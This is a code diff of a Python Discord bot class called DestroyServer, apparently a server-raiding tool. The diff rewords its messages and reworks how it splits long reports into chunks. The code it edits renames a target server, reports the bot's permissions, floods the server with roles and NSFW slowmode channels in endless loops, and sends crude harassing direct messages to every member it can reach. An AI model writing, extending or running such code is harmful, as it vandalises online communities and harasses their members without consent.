@@ -128,7 +128,7 @@ class DestroyServer(chattrigger.ChatTrigger):
 	async def servernamechange(self):
 
 		#await self.targetguild.edit(name = "。死", icon = None)
-		await self.targetguild.edit(name = "doin' your mom doin' doin' your mom", icon = None) # 2020-05-31 | I think doin' your mom doin' doin' your mom would be a better nuke-rename
+		await self.targetguild.edit(name = "Doin' your mom doin' doin' your mom", icon = None) # 2020-05-31 | I think doin' your mom doin' doin' your mom would be a better nuke-rename
 		# More universally understood
 
 
@@ -169,6 +169,19 @@ class DestroyServer(chattrigger.ChatTrigger):
 
 		#
 
+		# 2020-05-28
+
+		emojis = [str(x) for x in targetserver.emojis]
+		emojisstr = ", ".join(emojis)
+
+		messagestr += f"**Emojis ({len(emojis)}):**"
+
+		messagestr += f"{emojisstr}\n"
+
+		#
+
+		#
+
 		selfroles = [str(x) for x in targetserver.me.roles]
 		selfrolesstr = ", ".join(selfroles)
 
@@ -181,13 +194,13 @@ class DestroyServer(chattrigger.ChatTrigger):
 		messagestr += f"**Dot2 Permission Values:**\n"
 
 		messagestr += f'''Administrator: {selfpermissions.administrator}
-Manage Channels: {selfpermissions.manage_channels}
-Manage Roles: {selfpermissions.manage_roles}
-Manage Guild: {selfpermissions.manage_guild}
-Ban Members: {selfpermissions.ban_members}
+Manage Channels: {selfpermissions.manage_channels},
+Manage Roles: {selfpermissions.manage_roles},
+Manage Guild: {selfpermissions.manage_guild},
+Ban Members: {selfpermissions.ban_members},
 Kick Members: {selfpermissions.kick_members}'''
 
-		#
+
 
 		messagestr = discord.utils.escape_mentions(messagestr)
 
@@ -199,18 +212,38 @@ Kick Members: {selfpermissions.kick_members}'''
 
 		#chunks = []
 		
-		a = ""
-		c = 0
-		for i in messagestr: # discord 2000 character limit
-			if c == chunksize:
-				print(len(a))
-				await message.channel.send(a)
-				
-				a = ""
-				c = 0
-			a += str(i)
-			c += 1
-		await message.channel.send(a)
+		#a = ""
+		#c = 0
+		#for i in messagestr: # discord 2000 character limit
+		#	if c == chunksize:
+		#		print(len(a))
+		#		await message.channel.send(a)
+		#		
+		#		a = ""
+		#		c = 0
+		#	a += str(i)
+		#	c += 1
+		#await message.channel.send(a)
+
+		# 2020-05-28
+		# make it not split words
+
+		messagecsplit = messagestr.split(",")
+
+		tosend = ""
+
+		for i in messagecsplit:
+
+			if len(f"{tosend},{i}") > chunksize:
+
+				await message.channel.send(tosend)
+				tosend = "" # reset str
+			
+			#else:
+
+			tosend += f",{i}" # the seperator (,) is removed with split, so add it back
+		
+		await message.channel.send(tosend) # send the remainder
 
 	async def roleflood(self, targetserver: discord.Guild):
 
@@ -227,7 +260,7 @@ Kick Members: {selfpermissions.kick_members}'''
 		while 1:
 			try:
 				#a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
-				await targetserver.create_role(name = "PWNED", colour = colour, reason = "FUCK YOU LOLOLOL")
+				await targetserver.create_role(name = "IN THE NAME OF JOHN", colour = colour, reason = "JOHN HAS ARRIVED")
 			except:
 				print("Reached role limit!")
 				#await a.delete()
@@ -245,9 +278,9 @@ Kick Members: {selfpermissions.kick_members}'''
 
 		while 1:
 			try:
-				await targetserver.create_text_channel("P-W-N-E-D", position = 0, topic = "get fucked kid", slowmode_delay = 21600, nsfw = True, reason = "get fucked you bacon hair")
+				await targetserver.create_text_channel("JOHN IS HERE", position = 0, topic = "ALMIGHTY JOHN HAS LIBERATED US", slowmode_delay = 21600, nsfw = True, reason = "JOHN IS HERE TO STAY")
 			except:
-				print("Reached Chanenl Limit!")
+				print("Reached Channel Limit!")
 				await self.message.channel.send("Reached channel limit!")
 				return
 
@@ -260,7 +293,7 @@ Kick Members: {selfpermissions.kick_members}'''
 			try:
 				dmc = await i.create_dm()
 
-				await dmc.send("get fucked you bacon haired freak")
+				await dmc.send("hey, john here. im doin' your mom doin' doin' your mom")
 
 				d += 1
 			except:
